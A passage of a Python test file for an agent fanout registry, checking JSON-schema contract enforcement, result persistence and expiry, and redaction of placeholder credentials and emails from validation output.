        correlation_key="context.lane_id",
        results=[{"key": "ref_root_lane", "content": {"ok": False}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["ref_root_lane"]


def test_code_partial_never_persists_invalid_content(tmp_path: Any) -> None:
    """Kind validation precedes even partial persistence (round-20 follow-up)."""
    registry = FanoutRegistry(tmp_path)
    question = "Which manifest declares the package?"
    session_id = "sess-code-early"
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id=session_id,
        question=question,
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    fanout_id = register_code_investigation_fanout(
        registry,
        session_id=session_id,
        request=meta["code_investigation_request"],
    )
    out = submit_fanout_results(
        registry,
        session_id=session_id,
        correlation_key="code_facts",
        results=[
            {"key": "code_facts", "content": _code_fact_output("some-other-session", question)}
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["synthesis_rejected_keys"] == ["code_facts"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}


def test_invalid_retry_still_scrubs_legacy_violating_value(tmp_path: Any) -> None:
    """Scrubbing judges the accumulated value independently (round-21 probe).

    An old invalid data value plus a NEW invalid retry for the same lane
    previously re-saved the old email because the scrub filter excluded
    lanes already violating in the current call.
    """
    from ouroboros.mcp.tools.subagent import FANOUT_KIND_QUESTION_ADVISORY, FanoutRecord

    registry = FanoutRegistry(tmp_path)
    metadata_lanes = _interview_question_advisory_fanout_metadata()["lanes"]
    data_contract = next(
        lane["answer_contract"] for lane in metadata_lanes if lane["lane_id"] == "data_context"
    )
    old_invalid = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Contact old-leak@example.com",
        "confidence": "reported_by_tool",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": False,
    }
    record = FanoutRecord(
        fanout_id="fanout_retry_scrub",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-retry-scrub",
        correlation_key="context.lane_id",
        expected_keys=("data_context", "ambiguity_contrarian", "answer_simplifier"),
        synthesizer_input={
            "lane_ids": ["data_context", "ambiguity_contrarian", "answer_simplifier"],
            "lane_answer_contracts": {"data_context": dict(data_contract)},
        },
        required_keys=("data_context", "ambiguity_contrarian", "answer_simplifier"),
        received_results={"data_context": old_invalid},
    )
    assert registry.save(record)

    new_invalid = {**old_invalid, "finding": "Another bad attempt with new-leak@example.com"}
    out = submit_fanout_results(
        registry,
        session_id="sess-retry-scrub",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": new_invalid},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        ],
        fanout_id="fanout_retry_scrub",
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    persisted = (tmp_path / "fanout_retry_scrub.json").read_text()
    assert "old-leak@example.com" not in persisted
    assert "new-leak@example.com" not in persisted


def test_allof_object_root_contract_is_enforceable(tmp_path: Any) -> None:
    """Every publicly accepted object form is enforceable (round-21 probe).

    An allOf-wrapped object contract was silently dropped at registration,
    after which {"ok": false} completed with no violation.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    allof_contract = {
        "contract_id": "allof_root.v1",
        "response_model_schema": {
            "allOf": [
                {
                    "type": "object",
                    "required": ["lane_id", "verdict"],
                    "properties": {
                        "lane_id": {"const": "allof_lane"},
                        "verdict": {"type": "string"},
                    },
                },
                {"required": ["lane_id"]},
            ]
        },
    }
    assert _enforceable_lane_contract(allof_contract)

    scalar_allof = {
        "contract_id": "allof_scalar.v1",
        "response_model_schema": {"allOf": [{"type": "string"}]},
    }
    assert not _enforceable_lane_contract(scalar_allof)

    lanes = [
        {
            "lane_id": "allof_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": allof_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-allof", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-allof",
        correlation_key="context.lane_id",
        results=[{"key": "allof_lane", "content": {"ok": False}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["allof_lane"]


def test_oneof_object_root_contract_is_enforceable(tmp_path: Any) -> None:
    """oneOf/anyOf all-object roots are advertised and enforced (round-22).

    A disjunction forces object instances only when EVERY branch declares an
    object — a valid all-object oneOf was previously dropped, after which a
    required lane completed with invalid content unvalidated.
    """
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    oneof_contract = {
        "contract_id": "oneof_root.v1",
        "response_model_schema": {
            "oneOf": [
                {
                    "type": "object",
                    "required": ["lane_id", "verdict"],
                    "properties": {
                        "lane_id": {"const": "oneof_lane"},
                        "verdict": {"type": "string"},
                    },
                    "additionalProperties": False,
                },
                {
                    "type": "object",
                    "required": ["lane_id", "noop"],
                    "properties": {
                        "lane_id": {"const": "oneof_lane"},
                        "noop": {"const": True},
                    },
                    "additionalProperties": False,
                },
            ]
        },
    }
    assert _enforceable_lane_contract(oneof_contract)

    # A disjunction with a NON-object alternative cannot force objects.
    mixed_oneof = {
        "contract_id": "oneof_mixed.v1",
        "response_model_schema": {"oneOf": [{"type": "object"}, {"type": "string"}]},
    }
    assert not _enforceable_lane_contract(mixed_oneof)

    lanes = [
        {
            "lane_id": "oneof_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": oneof_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-oneof", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-oneof",
        correlation_key="context.lane_id",
        results=[{"key": "oneof_lane", "content": {"invalid": True}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["oneof_lane"]

    conforming = submit_fanout_results(
        registry,
        session_id="sess-oneof",
        correlation_key="context.lane_id",
        results=[{"key": "oneof_lane", "content": {"lane_id": "oneof_lane", "noop": True}}],
        fanout_id=fanout_id,
    )
    assert conforming["status"] == "complete"


def test_const_object_root_contract_is_enforceable(tmp_path: Any) -> None:
    """A const-object schema necessarily describes an object (round-23)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    const_contract = {
        "contract_id": "const_root.v1",
        "response_model_schema": {"const": {"ok": True}},
    }
    assert _enforceable_lane_contract(const_contract)

    scalar_const = {
        "contract_id": "const_scalar.v1",
        "response_model_schema": {"const": "just-a-string"},
    }
    assert not _enforceable_lane_contract(scalar_const)

    lanes = [
        {
            "lane_id": "const_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": const_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-const", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-const",
        correlation_key="context.lane_id",
        results=[{"key": "const_lane", "content": {"ok": False}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["const_lane"]

    conforming = submit_fanout_results(
        registry,
        session_id="sess-const",
        correlation_key="context.lane_id",
        results=[{"key": "const_lane", "content": {"ok": True}}],
        fanout_id=fanout_id,
    )
    assert conforming["status"] == "complete"


def test_type_array_object_contract_is_enforceable(tmp_path: Any) -> None:
    """{"type": ["object"]} forces objects; multi-type unions do not (r24)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    array_type_contract = {
        "contract_id": "array_type.v1",
        "response_model_schema": {
            "type": ["object"],
            "required": ["lane_id", "verdict"],
            "properties": {
                "lane_id": {"const": "array_lane"},
                "verdict": {"type": "string"},
            },
        },
    }
    assert _enforceable_lane_contract(array_type_contract)

    union_contract = {
        "contract_id": "union_type.v1",
        "response_model_schema": {"type": ["object", "null"]},
    }
    assert not _enforceable_lane_contract(union_contract)

    lanes = [
        {
            "lane_id": "array_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": array_type_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-array-type", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-array-type",
        correlation_key="context.lane_id",
        results=[{"key": "array_lane", "content": {"invalid": True}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["array_lane"]


def test_all_lane_violation_messages_are_redacted(tmp_path: Any) -> None:
    """No lane's rejected value leaks through its violation report (r24).

    A non-data lane failing pattern validation with an email/token value
    previously copied the full rejected value into the response AND the
    persisted terminal record via jsonschema's echoing messages.
    """
    lanes = [
        {
            "lane_id": "guarded_lane",
            "capability": "future_capability",
            "required": False,
            "answer_contract": {
                "contract_id": "guarded.v1",
                "response_model_schema": {
                    "type": "object",
                    "required": ["lane_id", "note"],
                    "properties": {
                        "lane_id": {"const": "guarded_lane"},
                        "note": {"type": "string", "pattern": r"^[0-9 %]+$"},
                    },
                },
            },
        },
        {
            "lane_id": "ambiguity_contrarian",
            "capability": "run_lateral_review",
            "persona": "contrarian",
            "required": True,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-redact-all", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-redact-all",
        correlation_key="context.lane_id",
        results=[
            {
                "key": "guarded_lane",
                "content": {
                    "lane_id": "guarded_lane",
                    "note": "alice@example.com token=sk-live-123",
                },
            },
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    violations = out["contract_violations"]
    assert [item["lane_id"] for item in violations] == ["guarded_lane"]
    joined = " ".join(violations[0]["errors"])
    assert "alice@example.com" not in joined
    assert "sk-live-123" not in joined
    persisted = (tmp_path / f"{fanout_id}.json").read_text()
    assert "alice@example.com" not in persisted
    assert "sk-live-123" not in persisted


def test_blank_content_does_not_count_toward_completion(tmp_path: Any) -> None:
    """content: "" is not a usable finding (round-24 warning)."""
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-blank",
        payloads=_mixed_advisory_payloads(),
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-blank",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": ""},
            {"key": "answer_simplifier", "content": "   "},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out["malformed_keys"] == ["ambiguity_contrarian", "answer_simplifier"]
    record = registry.load(fanout_id)
    assert record is not None
    assert record.received_results == {}


def test_expired_record_is_unknown_at_load(tmp_path: Any) -> None:
    """The 7-day retention contract binds load/replay too (round-25 probe)."""
    import os as os_module
    import time

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-expiry",
        payloads=_mixed_advisory_payloads(),
    )
    first = submit_fanout_results(
        registry,
        session_id="sess-expiry",
        correlation_key="context.lane_id",
        results=[
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert first["status"] == "complete"

    ancient = time.time() - FanoutRegistry._RECORD_RETENTION_SECONDS - 3600
    os_module.utime(tmp_path / f"{fanout_id}.json", (ancient, ancient))
    assert registry.load(fanout_id) is None
    replay = submit_fanout_results(
        registry,
        session_id="sess-expiry",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "unknown_fanout_id"


def test_id_rebased_schema_is_declared_unsupported() -> None:
    """$id rebasing is outside the declared grammar (round-25)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    id_contract = {
        "contract_id": "id_scoped.v1",
        "response_model_schema": {
            "$id": "https://example.com/base.json",
            "type": "object",
            "properties": {"payload": {"$ref": "#/$defs/shape"}},
            "$defs": {"shape": {"type": "string"}},
        },
    }
    assert not _enforceable_lane_contract(id_contract)

    # A literal type: object WITH a $ref sibling stays enforceable — the
    # declaration alone forces objects (2020-12 conjunctive $ref).
    sibling_contract = {
        "contract_id": "ref_sibling.v1",
        "response_model_schema": {
            "type": "object",
            "$ref": "#/$defs/extra",
            "required": ["lane_id"],
            "properties": {"lane_id": {"const": "sibling_lane"}},
            "$defs": {"extra": {"required": ["lane_id"]}},
        },
    }
    assert _enforceable_lane_contract(sibling_contract)


def test_json_text_child_results_are_normalized(tmp_path: Any) -> None:
    """content is 'object or text' — JSON text validates as its object (r25)."""
    import json as json_module

    registry = FanoutRegistry(tmp_path)
    request = {
        "session_id": "sess-json-text",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": _interview_question_advisory_fanout_metadata()["lanes"],
    }
    payloads = build_interview_question_advisory_subagents(request)
    fanout_id = register_question_advisory_fanout(
        registry, session_id="sess-json-text", payloads=payloads
    )

    conforming_text = json_module.dumps(
        {
            "lane_id": "data_context",
            "data_needed": False,
            "finding": "No data evidence is needed for this question.",
            "confidence": "no_evidence",
            "evidence": [],
            "proposed_queries": [],
            "requires_user_confirmation": True,
        }
    )
    out = submit_fanout_results(
        registry,
        session_id="sess-json-text",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": conforming_text},
            {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
            {"key": "answer_simplifier", "content": "simplifier-advice"},
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []
    aggregated = {item["lane_id"]: item["output"] for item in out["result"]["aggregated_outputs"]}
    assert aggregated["data_context"]["data_needed"] is False

    # Non-JSON text on a contracted lane is still a violation.
    plain_text = submit_fanout_results(
        registry,
        session_id="sess-json-text",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": "just prose"}],
        fanout_id=fanout_id,
    )
    assert plain_text["status"] == "already_complete"


def test_property_named_dollar_id_is_not_schema_rebasing() -> None:
    """$id as a PROPERTY NAME is data, not a keyword (round-26 warning)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    property_contract = {
        "contract_id": "id_property.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["$id", "verdict"],
            "properties": {
                "$id": {"type": "string", "pattern": r"^[0-9]+$"},
                "verdict": {"type": "string"},
            },
        },
    }
    assert _enforceable_lane_contract(property_contract)

    keyword_contract = {
        "contract_id": "id_keyword.v1",
        "response_model_schema": {
            "$id": "https://example.com/base.json",
            "type": "object",
        },
    }
    assert not _enforceable_lane_contract(keyword_contract)


def test_ref_inside_const_data_is_not_a_reference() -> None:
    """$ref inside literal data is instance content (round-27 probe)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    const_ref_contract = {
        "contract_id": "const_ref.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["payload"],
            "properties": {"payload": {"const": {"$ref": "literal-output-value"}}},
        },
    }
    assert _enforceable_lane_contract(const_ref_contract)

    # A REAL unresolvable schema-level ref still rejects.
    schema_ref_contract = {
        "contract_id": "schema_ref.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$ref": "#/$defs/missing"}},
        },
    }
    assert not _enforceable_lane_contract(schema_ref_contract)


def test_extension_annotations_do_not_disable_enforcement() -> None:
    """Unknown extension keywords are annotations, not schemas (round-28)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    annotated_contract = {
        "contract_id": "annotated.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["lane_id", "verdict"],
            "properties": {
                "lane_id": {"const": "annotated_lane"},
                "verdict": {"type": "string"},
            },
            "x-output-example": {"$ref": "literal-output-value"},
        },
    }
    assert _enforceable_lane_contract(annotated_contract)

    # A real unresolvable ref in a SCHEMA position still rejects.
    schema_position = {
        "contract_id": "schema_pos.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$ref": "#/$defs/missing"}},
        },
    }
    assert not _enforceable_lane_contract(schema_position)


def test_ref_sibling_with_object_forcing_allof_is_enforceable(tmp_path: Any) -> None:
    """Conjunctive siblings alongside a root $ref qualify (round-29)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    sibling_allof_contract = {
        "contract_id": "ref_allof.v1",
        "response_model_schema": {
            "$ref": "#/$defs/extra",
            "allOf": [
                {
                    "type": "object",
                    "required": ["lane_id", "ok"],
                    "properties": {
                        "lane_id": {"const": "ref_allof_lane"},
                        "ok": {"const": True},
                    },
                }
            ],
            "$defs": {"extra": {"required": ["lane_id"]}},
        },
    }
    assert _enforceable_lane_contract(sibling_allof_contract)

    lanes = [
        {
            "lane_id": "ref_allof_lane",
            "capability": "future_capability",
            "required": True,
            "answer_contract": sibling_allof_contract,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-ref-allof", lanes=lanes
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-ref-allof",
        correlation_key="context.lane_id",
        results=[{"key": "ref_allof_lane", "content": {"ok": False}}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert [item["lane_id"] for item in out["contract_violations"]] == ["ref_allof_lane"]


def test_identifier_fields_are_exempt_from_credential_scan() -> None:
    """A tool named token_usage_v2 is not a secret (round-29 warning)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    output = _minimal_data_output("premium plans average 12,400 tokens/day")
    output["evidence"][0]["source"] = "token_usage_v2"
    assert _data_evidence_boundary_violations(output) == []

    # A credential shape in the VALUE still rejects.
    leaked = _minimal_data_output("token=sk-live-123 spotted in 3 configs")
    assert any("credential" in error for error in _data_evidence_boundary_violations(leaked))


def test_plugin_child_prompt_carries_from_data_glossary() -> None:
    """Provenance semantics are transport-uniform (round-29 B4)."""
    from ouroboros.mcp.tools.subagent import build_interview_subagent

    p = build_interview_subagent(
        session_id="sess-glossary",
        action="start",
        initial_context="Build a web app",
    )
    assert "[from-data]" in p.prompt
    assert "point-in-time description" in p.prompt


def test_credential_wearing_identifier_field_is_rejected() -> None:
    """The identifier exemption requires identifier SYNTAX (round-30 probe)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    source_leak = _minimal_data_output("78% of MAU are on the free tier")
    source_leak["evidence"][0]["source"] = "token=sk-live-123"
    assert any("credential" in error for error in _data_evidence_boundary_violations(source_leak))

    tool_leak = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Needs a query.",
        "confidence": "inferred",
        "evidence": [],
        "proposed_queries": [
            {
                "tool_name": "token=sk-live-456",
                "request": {"operation": "read", "metric": "active_users", "aggregation": "count"},
                "expected_decision": "n/a",
                "source_class": "external",
            }
        ],
        "requires_user_confirmation": True,
    }
    assert any("credential" in error for error in _data_evidence_boundary_violations(tool_leak))

    # A genuine identifier stays exempt.
    legit = _minimal_data_output("premium plans average 12,400 tokens/day")
    legit["evidence"][0]["source"] = "token_usage_v2"
    assert _data_evidence_boundary_violations(legit) == []


def test_non_schema_ref_targets_and_cycles_are_rejected() -> None:
    """A ref must target a SCHEMA and chains must progress (round-30)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    prose_target = {
        "contract_id": "prose_target.v1",
        "response_model_schema": {
            "type": "object",
            "description": "just prose",
            "properties": {"payload": {"$ref": "#/description"}},
        },
    }
    assert not _enforceable_lane_contract(prose_target)

    self_cycle = {
        "contract_id": "self_cycle.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$ref": "#/$defs/a"}},
            "$defs": {"a": {"$ref": "#/$defs/a"}},
        },
    }
    assert not _enforceable_lane_contract(self_cycle)

    # A ref chain that terminates in a real schema stays enforceable.
    chained = {
        "contract_id": "chained.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"payload": {"$ref": "#/$defs/a"}},
            "$defs": {"a": {"$ref": "#/$defs/b"}, "b": {"type": "string"}},
        },
    }
    assert _enforceable_lane_contract(chained)


def test_known_lane_contract_reaches_its_child_prompt(tmp_path: Any) -> None:
    """Contract rendering is lane-agnostic (round-30 probe).

    An additive contract attached to a RECOGNIZED lane (code_context) was
    enforced at re-entry but never rendered to its child, which then
    followed the generic prompt and was rejected indefinitely.
    """
    code_contract = {
        "contract_id": "code_extra.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["lane_id", "verdict"],
            "properties": {
                "lane_id": {"const": "code_context"},
                "verdict": {"type": "string"},
            },
        },
    }
    request = {
        "session_id": "sess-known-contract",
        "question_identity": "interview-question:0123456789abcdef",
        "question": "Which plan tier do most active users hit?",
        "user_question_first": True,
        "lanes": [
            {
                "lane_id": "code_context",
                "capability": "inspect_code",
                "required": True,
                "answer_contract": code_contract,
            },
        ],
    }
    payloads = build_interview_question_advisory_subagents(request)
    prompt = payloads[0].prompt
    assert "code_extra.v1" in prompt
    assert "generic Output section below is superseded" in prompt

    # And the plugin recipe renders it too (shared lane loop).
    from ouroboros.mcp.tools.subagent import _plugin_advisory_contract_section

    section = _plugin_advisory_contract_section(
        "fanout_x", {"lanes": request["lanes"]}, "sess-known-contract"
    )
    assert "code_extra.v1" in section


def test_standalone_secret_identifiers_are_not_exempt() -> None:
    """A secret that IS an identifier keeps full scanning (round-31)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    for secret_name in ("ghp_abcdef123456", "sk_live_123456", "token_abcdef123456"):
        output = _minimal_data_output("78% of MAU are on the free tier")
        output["evidence"][0]["source"] = secret_name
        assert any(
            "credential" in error or "secret" in error
            for error in _data_evidence_boundary_violations(output)
        ), secret_name

    # Word-suffixed tool names keep the exemption.
    legit = _minimal_data_output("premium plans average 12,400 tokens/day")
    legit["evidence"][0]["source"] = "token_usage_v2"
    assert _data_evidence_boundary_violations(legit) == []


def test_root_recursive_ref_is_declared_unsupported() -> None:
    """ "$ref": "#" cannot be advertised (round-31 probe)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    recursive_contract = {
        "contract_id": "recursive_root.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"child": {"$ref": "#"}},
        },
    }
    assert not _enforceable_lane_contract(recursive_contract)


def test_word_laundered_credential_identifier_is_rejected() -> None:
    """A word segment cannot launder gibberish segments (round-32 probe)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    leak = _minimal_data_output("78% of MAU are on the free tier")
    leak["evidence"][0]["source"] = "api_key_prod_123abc"
    assert any(
        "credential" in error or "secret" in error
        for error in _data_evidence_boundary_violations(leak)
    )

    legit = _minimal_data_output("premium plans average 12,400 tokens/day")
    legit["evidence"][0]["source"] = "token_usage_v2"
    assert _data_evidence_boundary_violations(legit) == []


def test_noop_caveat_is_not_a_failure_and_timeouts_reject(tmp_path: Any) -> None:
    """Both directions of the round-32 error-contract probe.

    "upstream timeout; 3 attempts" as executed evidence rejects, while a
    no-op's caveat narrating that no lookup was needed stays valid — the
    failed-lookup contradiction requires executed evidence to exist.
    """
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    timeout_evidence = _minimal_data_output("upstream timeout; 3 attempts")
    errors = _data_evidence_boundary_violations(timeout_evidence)
    assert any("describes a failed lookup" in error for error in errors)

    noop = {
        "lane_id": "data_context",
        "data_needed": False,
        "finding": "No data evidence is needed for this question.",
        "confidence": "no_evidence",
        "evidence": [],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["No data was returned because no lookup was needed."],
    }
    assert _data_evidence_boundary_violations(noop) == []


def test_dynamic_ref_cycles_are_rejected() -> None:
    """Cycle detection follows every reference keyword (round-32 probe)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    dynamic_cycle = {
        "contract_id": "dynamic_cycle.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"child": {"$ref": "#/$defs/a"}},
            "$defs": {
                "a": {"$dynamicRef": "#/$defs/b"},
                "b": {"$ref": "#/$defs/a"},
            },
        },
    }
    assert not _enforceable_lane_contract(dynamic_cycle)


def test_alphabetic_credential_identifier_is_rejected() -> None:
    """Secret-marker words mark alphabetic credentials (round-33)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    leak = _minimal_data_output("78% of MAU are on the free tier")
    leak["evidence"][0]["source"] = "api_key_live_supersecret"
    assert any(
        "credential" in error or "secret" in error
        for error in _data_evidence_boundary_violations(leak)
    )

    legit = _minimal_data_output("premium plans average 12,400 tokens/day")
    legit["evidence"][0]["source"] = "token_usage_v2"
    assert _data_evidence_boundary_violations(legit) == []


def test_metacharacter_lane_ids_are_never_registered(tmp_path: Any) -> None:
    """The lane-id grammar and re-entry validation agree (round-33)."""
    lanes = [
        {
            "lane_id": "future|lane",
            "capability": "future_capability",
            "required": True,
        },
        {
            "lane_id": "future_lane_ok",
            "capability": "future_capability",
            "required": True,
        },
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-lane-grammar", lanes=lanes
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    # The metacharacter id is skipped — never an expected key it could not
    # complete through the transport validator.
    assert record.expected_keys == ("future_lane_ok",)


def test_allof_routed_ref_cycle_is_rejected() -> None:
    """Reference cycles through subschema branches reject (round-33)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    allof_cycle = {
        "contract_id": "allof_cycle.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"child": {"$ref": "#/$defs/a"}},
            "$defs": {
                "a": {"allOf": [{"$ref": "#/$defs/b"}]},
                "b": {"allOf": [{"$ref": "#/$defs/a"}]},
            },
        },
    }
    assert not _enforceable_lane_contract(allof_cycle)

    # An acyclic graph through subschemas stays enforceable.
    acyclic = {
        "contract_id": "allof_acyclic.v1",
        "response_model_schema": {
            "type": "object",
            "properties": {"child": {"$ref": "#/$defs/a"}},
            "$defs": {
                "a": {"allOf": [{"$ref": "#/$defs/b"}]},
                "b": {"type": "string"},
            },
        },
    }
    assert _enforceable_lane_contract(acyclic)


def test_alphabetic_credential_assignment_is_rejected() -> None:
    """api_key=supersecret is a secret, digits or not (round-34 probe)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    probe = _minimal_data_output("42 accounts; api_key=supersecret")
    errors = _data_evidence_boundary_violations(probe)
    assert any("credential-assignment" in error for error in errors)

    clean = _minimal_data_output("42 accounts use api keys; 12% rotated this month")
    assert _data_evidence_boundary_violations(clean) == []


def test_hyphenated_identity_rows_are_rejected() -> None:
    """user-123 style ids mark identity rows (round-34 probe)."""
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations

    probe = _minimal_data_output("user-123 premium 34, user-456 free 12")
    errors = _data_evidence_boundary_violations(probe)
    assert any("row-shaped" in error for error in errors)

    clean = _minimal_data_output("region us-east 34, region eu-west 12")
    assert _data_evidence_boundary_violations(clean) == []


def test_long_local_ref_chains_stay_enforceable() -> None:
    """Valid deep ref chains are not depth-capped away (round-34 probe)."""
    from ouroboros.mcp.tools.subagent import _enforceable_lane_contract

    defs: dict[str, Any] = {}
    for i in range(8):
        defs[f"d{i}"] = {"$ref": f"#/$defs/d{i + 1}"}
    defs["d8"] = {"type": "string", "const": "leaf"}
    chain_contract = {
        "contract_id": "deep_chain.v1",
        "response_model_schema": {
            "type": "object",
            "required": ["payload"],
            "properties": {"payload": {"$ref": "#/$defs/d0"}},
            "$defs": defs,
        },
    }
    assert _enforceable_lane_contract(chain_contract)


def test_known_tool_grammar_matches_safe_identifier_grammar(monkeypatch: Any) -> None:
    """Configured tool names round-trip the identifier contract (round-34)."""
    monkeypatch.setenv("OUROBOROS_KNOWN_DATA_TOOLS", "token:usage_v2,token_usage_v2")
    meta: dict[str, Any] = {}
    _attach_question_assist_requests(
        meta,
        session_id="sess-grammar-align",
        question="Which plan tier do most active users hit?",
        phase="answer",
        score=None,
        dispatch_mode=SubagentDispatchMode.HOST_DRIVEN,
        runtime_backend="codex",
    )
    lanes = {lane["lane_id"]: lane for lane in meta["question_advisory_request"]["lanes"]}
    # The colon form is filtered out; the aligned form survives and is NOT
    # credential-shaped at re-entry.
    assert lanes["data_context"]["known_data_tools"] == ["token_usage_v2"]


def test_legacy_record_without_required_keys_treats_all_expected_as_required() -> None:
    """Records persisted before the required/optional split keep the old gate."""
    record = FanoutRecord.from_dict(
        {
            "fanout_id": "fanout_legacy",
            "kind": FANOUT_KIND_QUESTION_ADVISORY,
            "session_id": "s1",
            "correlation_key": "context.lane_id",
            "expected_keys": ["code_context", "answer_simplifier"],
            "synthesizer_input": {"lane_ids": ["code_context", "answer_simplifier"]},
        }
    )
    assert record.required_keys == ("code_context", "answer_simplifier")


# --------------------------------------------------------------------------- #
# Registry state-dir threading (#1578 follow-up, MEDIUM)
# --------------------------------------------------------------------------- #


def test_registry_rebase_default_moves_default_location_only(tmp_path: Any) -> None:
    default_registry = FanoutRegistry()
    default_registry.rebase_default(tmp_path / "fanout")
    assert default_registry.directory == tmp_path / "fanout"
    # A second rebase is a no-op: the registry is no longer default-located.
    default_registry.rebase_default(tmp_path / "other")
    assert default_registry.directory == tmp_path / "fanout"

    explicit = FanoutRegistry(tmp_path / "explicit")
    explicit.rebase_default(tmp_path / "fanout")
    assert explicit.directory == tmp_path / "explicit"


def test_interview_handler_threads_state_dir_into_registry(tmp_path: Any) -> None:
